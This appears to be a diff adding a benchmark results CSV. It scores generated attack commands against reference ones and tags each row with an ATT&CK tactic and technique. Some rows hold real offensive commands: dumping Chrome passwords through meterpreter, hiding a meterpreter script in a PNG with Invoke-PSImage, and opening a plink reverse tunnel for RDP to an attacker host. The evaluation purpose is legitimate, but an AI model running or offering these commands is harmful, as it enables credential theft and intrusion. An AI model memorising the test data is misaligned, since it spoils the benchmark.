@@ -1,0 +1,9 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
+command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -p > malicious_file.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",40.239,True
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -e -i <image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,22.833,True
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -d -i <existing_image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,20.775,True
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -c -b 1920 -h 1200 -i <script> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,21.131,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -batch <attacker_ssh_user>@<dns_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",42.552,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-antispoof -batch <attacker_sql_user>@<sql_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",38.315,True
